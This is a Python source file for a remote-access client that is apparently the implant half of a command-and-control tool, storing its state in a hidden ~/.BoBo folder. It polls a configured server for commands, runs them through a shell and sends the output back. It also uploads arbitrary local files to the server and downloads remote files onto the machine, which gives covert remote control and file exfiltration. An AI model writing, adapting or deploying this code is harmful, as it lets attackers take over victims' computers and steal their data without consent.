import config
import os
import socket
import requests
import time
import uuid
import subprocess
import sys
import traceback
import threading
import getpass

def threaded(func):
    def wrapper(*_args, **kwargs):
        thread = threading.Thread(target = func, args =_args)
        thread.start()
        return
    return wrapper

class Client(object):
    def __init__(self):
        self.idle = True
        self.silent = False
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = getpass.getuser() + "_" + str(uuid.getnode())
        self.host = socket.gethostname()
        self.username = getpass.getuser()

    def install_location(self):

        directory = os.path.expandvars(os.path.expanduser('~/.BoBo'))
        if os.path.exists(directory):
            return directory
        else:
            return None

    def is_installed(self):
        return self.install_location()

    def get_consecutive_failed(self):
        if self.is_installed():
            directory = self.install_location()
            file = os.path.join(directory, "failed_connections")
            if os.path.exists(file):
                with open(file, "r") as f:
                    return int(f.read())
            else:
                return 0
        else:
            return self.failed_connections

    def update_consecutive_failed(self, value):
        if self.is_installed():
            install_dir = self.install_location()
            file = os.path.join(install_dir, "failed_connections")
            with open(file, "w") as f:
                f.write(str(value))
        else:
            self.failed_connections = value

    def stats(self, info):
        print(info)

    def request_command(self):
        request = requests.post(config.SERVER + '/Utilities/' + self.uid + '/get_current_command', json={'hostname': self.host, 'username': self.username})
        return request.text

    def send_data(self, output, newlines=True):
        if self.silent:
            self.stats(output)
            return
        if not output:
            return
        if newlines:
            output += "\n\n"
        request = requests.post(config.SERVER + '/Utilities/' + self.uid + '/command_result', data={'output': output})

    @threaded
    def runcommand(self, cmd):
        try:
            process = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            out, err = process.communicate()
            output = (out + err)
            self.send_data(output)
        except Exception:
            self.send_data(traceback.format_exc())

    @threaded
    def upload(self, file):
        file = os.path.expandvars(os.path.expanduser(file))
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_data("Uploading %s." % file)
                requests.post(config.SERVER + '/Utilities/' + self.uid + '/upload',
                              files={'uploaded': open(file, 'rb')})
            else:
                self.send_data(' No such file: ' + file)
        except Exception:
            self.send_data(traceback.format_exc())

    @threaded
    def download(self, file, dest = ""):
        try:
            dest = os.path.expandvars(os.path.expanduser(dest))
            if not dest:
                dest = file.split('/')[-1]
            self.send_data("Downloading %s." % file)
            request = requests.get(file, stream=True)
            with open(dest, 'wb') as buffer:
                    for payload in request.iter_content(chunk_size=8000):
                        if payload:
                            buffer.write(payload)
            self.send_data("File downloaded: " + dest)

        except Exception:
            self.send_data(traceback.format_exc())

    def exit(self):
        self.send_data('Exiting.')
        sys.exit(0)

    def help(self):
        self.send_data(config.HELP)

    def cd(self, directory):
        os.chdir(os.path.expandvars(os.path.expanduser(directory)))

    def run(self):
        self.silent = False
        while True:
            try:
                new_cmd = self.request_command()
                self.update_consecutive_failed(0)
                if new_cmd:
                    commandline = new_cmd
                    self.idle = False
                    self.last_active = time.time()
                    self.send_data('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        if command == 'cd':
                            if not args:
                                self.send_data('usage: cd </path/to/directory>')
                            else:
                                self.cd(args[0])
                        elif command == 'upload':
                            if not args:
                                self.send_data('usage: upload <localfile>')
                            else:
                                self.upload(args[0], )
                        elif command == 'download':
                            if not args:
                                self.send_data('usage: download <remote_url> <destination>')
                            else:
                                if len(args) == 2:
                                    self.download(args[0], args[1])
                                else:
                                    self.download(args[0])
                        elif command == 'exit':
                            self.exit()
                        elif command == 'help':
                            self.help()
                        else:
                            self.runcommand(commandline)
                    except Exception:
                        self.send_data(traceback.format_exc())
                else:
                    if self.idle:
                        time.sleep(config.INTERVAL)
                    elif (time.time() - self.last_active) > config.IDLE:
                        self.stats("Becoming idle.")
                        self.idle = True
                    else:
                        time.sleep(1.0)
            except Exception:
                self.stats(traceback.format_exc())
                failed_connections = self.get_consecutive_failed()
                failed_connections += 1
                self.update_consecutive_failed(failed_connections)
                self.stats("Consecutive failed connections: %d" % failed_connections)
                if failed_connections > config.MAX_FAILED:
                    self.silent = True
                    self.exit()
                time.sleep(config.INTERVAL)

def main():
    client = Client()
    client.run()

if __name__ == "__main__":
    main()
